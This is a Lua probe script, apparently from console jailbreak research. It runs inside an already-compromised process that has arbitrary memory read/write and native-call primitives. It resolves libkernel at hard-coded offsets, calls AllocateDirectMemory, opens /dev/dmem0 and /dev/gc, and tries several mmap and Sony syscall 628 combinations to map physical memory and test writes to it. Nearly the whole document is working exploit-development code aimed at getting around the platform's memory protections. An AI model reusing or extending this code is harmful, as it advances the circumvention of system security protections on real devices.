-- CRASH_CLASS: LOW
-- PROBE 552g: Map physical memory via mmap(477) + /dev/dmem0
--
-- MapDirectMemory (libkernel+0x15020) kills process on any call.
-- dlsym doesn't work. Can't find the correct address.
--
-- Alternative: open /dev/dmem0 and mmap with physical offset.
-- AllocateDirectMemory gives us a physical address (0x110010000+).
-- If mmap(477) with dmem0 fd + that offset works, we bypass
-- MapDirectMemory entirely.
--
-- Also try: mmap with /dev/gc, direct anonymous with phys hint

print("=== PROBE 552g: mmap physical memory via /dev/dmem0 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- libkernel
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
local lk_lo, lk_hi = 0, 0
pcall(function() mk(593)(uint64(0x2001), ib) end)
lk_lo = rd(N(ib) + 0x108) or 0
lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
if lk_lo == 0 and lk_hi == 0 then print("FAIL: libkernel"); return end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print(string.format("libkernel=0x%X%08X", lk_hi, lk_lo))

local alloc_fn = lk + uint64(0x17EF0)

-- Step 1: Allocate physical memory
local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))
local ok_a, rv_a = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
local phys = rq(N(phys_out))
print("AllocateDirectMemory: rv=" .. (ok_a and tostring(N(rv_a)) or "crash") ..
    " phys=" .. fmt(phys))
if not ok_a or N(rv_a) ~= 0 then print("FAIL: alloc"); return end

-- Step 2: Open /dev/dmem0
local sc_open = mk(5)
local devpath = memory.alloc(32)
-- "/dev/dmem0"
wd(N(devpath) + 0, 0x7665642F)   -- /dev
wd(N(devpath) + 4, 0x6D642F76)   -- v/dm -- wrong, let me fix
-- Actually write byte by byte
local path = "/dev/dmem0"
for i = 1, #path do wd(N(devpath) + i - 1, string.byte(path, i)) end
wd(N(devpath) + #path, 0)

local ok_o, fd_raw = pcall(function()
    return sc_open(uint64(N(devpath)), uint64(2), uint64(0))
end)
local dmem_fd = ok_o and N(fd_raw) or -1
print("dmem0 fd=" .. dmem_fd)

-- Also try /dev/gc
local gcpath = memory.alloc(16)
local gp = "/dev/gc"
for i = 1, #gp do wd(N(gcpath) + i - 1, string.byte(gp, i)) end
wd(N(gcpath) + #gp, 0)
local ok_g, gc_raw = pcall(function()
    return sc_open(uint64(N(gcpath)), uint64(2), uint64(0))
end)
local gc_fd = ok_g and N(gc_raw) or -1
print("gc fd=" .. gc_fd)

if not alive() then print("DIED after open"); return end

-- Step 3: Try mmap with dmem0 fd + physical offset
local sc_mmap = mk(477)

print("")
print("[A] mmap(477) with dmem0 fd + physical address offset")

local ph, pl = get_hi_lo(phys)
if ph < 0 then ph = ph + 0x100000000 end
if pl < 0 then pl = pl + 0x100000000 end

-- mmap(addr, len, prot, flags, fd, offset)
-- flags: MAP_SHARED=0x1, MAP_PRIVATE=0x2, MAP_FIXED=0x10
local combos = {
    {fd = dmem_fd, flags = 0x1,    name = "dmem0 MAP_SHARED"},
    {fd = dmem_fd, flags = 0x2,    name = "dmem0 MAP_PRIVATE"},
    {fd = dmem_fd, flags = 0x1,    name = "dmem0 MAP_SHARED prot=RW", prot = 3},
    {fd = dmem_fd, flags = 0x1001, name = "dmem0 MAP_SHARED|NOSYNC"},
    {fd = gc_fd,   flags = 0x1,    name = "gc MAP_SHARED"},
    {fd = gc_fd,   flags = 0x2,    name = "gc MAP_PRIVATE"},
}

for ci, c in ipairs(combos) do
    if not alive() then print("DIED"); break end
    if c.fd < 0 then
        print(string.format("  [%d] %s: fd invalid, skip", ci, c.name))
    else
        local prot = c.prot or 3
        print(string.format("  [%d] %s (fd=%d prot=%d flags=0x%X off=%s)",
            ci, c.name, c.fd, prot, c.flags, fmt(phys)))
        io.flush()
        local ok_m, rv_m = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(prot),
                uint64(c.flags), uint64(c.fd), phys)
        end)
        if not alive() then print("    KILLED"); break end
        if not ok_m then
            print("    pcall FAIL")
        else
            local rv = N(rv_m)
            local rh, rl = get_hi_lo(rv_m)
            if rh < 0 then rh = rh + 0x100000000 end
            if rl < 0 then rl = rl + 0x100000000 end
            if rv == -1 or (rh == 0xFFFFFFFF and rl == 0xFFFFFFFF) then
                print("    rv=-1 (MAP_FAILED)")
            else
                print("    rv=" .. fmt(rv_m) .. " *** MAPPED ***")
                -- Test R/W
                local tval = 0xCAFEBABE
                local wok = pcall(function() memory.write_dword(rv, tval) end)
                if wok then
                    local rval = rd(rv)
                    print(string.format("    R/W: wrote 0x%X read 0x%X %s",
                        tval, rval or 0, rval == tval and "OK" or "MISMATCH"))
                else
                    print("    write failed — read-only?")
                    local rval = rd(rv)
                    print("    read: " .. (rval and string.format("0x%X", rval) or "nil"))
                end
            end
        end
    end
end

-- Step 4: Try mmap with offset=0 on dmem0 (map from start)
print("")
print("[B] mmap dmem0 with offset=0 (base of direct memory)")
if dmem_fd >= 0 then
    local ok_b, rv_b = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(1), uint64(dmem_fd), uint64(0))
    end)
    if ok_b then
        local rv = N(rv_b)
        local rh, rl = get_hi_lo(rv_b)
        if rh < 0 then rh = rh + 0x100000000 end
        print("  rv=" .. fmt(rv_b) ..
            ((rh == 0xFFFFFFFF or rv == -1) and " (FAILED)" or " *** MAPPED ***"))
    else
        print("  pcall FAIL")
    end
end

-- Step 5: Try Sony syscall 628 (mmap_dmem) with correct args via SROP
-- (will need child thread for 7+ args, so just note it here)
print("")
print("[C] Sony syscall 628 via make_syscall (limited args)")
local sc628 = mk(628)
-- Try with dmem0 fd
if dmem_fd >= 0 then
    local vout = memory.alloc(8)
    wq(N(vout), uint64(0))
    local ok_c, rv_c = pcall(function()
        return sc628(uint64(N(vout)), uint64(0x4000), uint64(3),
            uint64(1), uint64(dmem_fd), phys)
    end)
    print(string.format("  628(dmem0,phys): ok=%s rv=%s",
        tostring(ok_c), ok_c and tostring(N(rv_c)) or "crash"))
end
-- Try with fd=-1
do
    local vout2 = memory.alloc(8)
    wq(N(vout2), uint64(0))
    local ok_d, rv_d = pcall(function()
        return sc628(uint64(N(vout2)), uint64(0x4000), uint64(3),
            uint64(1), uint64(0xFFFFFFFF), phys)
    end)
    print(string.format("  628(fd=-1,phys): ok=%s rv=%s",
        tostring(ok_d), ok_d and tostring(N(rv_d)) or "crash"))
end

-- Step 6: Try GetDirectMemorySize to verify phys range
local getdm_fn = lk + uint64(0x17810)
local ok_g2, rv_g2 = pcall(function()
    return native.fcall_with_rax(getdm_fn, 0)
end)
print("")
print("GetDirectMemorySize: " .. (ok_g2 and fmt(rv_g2) or "crash"))

print("")
print("alive=" .. tostring(alive()))
print("DONE")
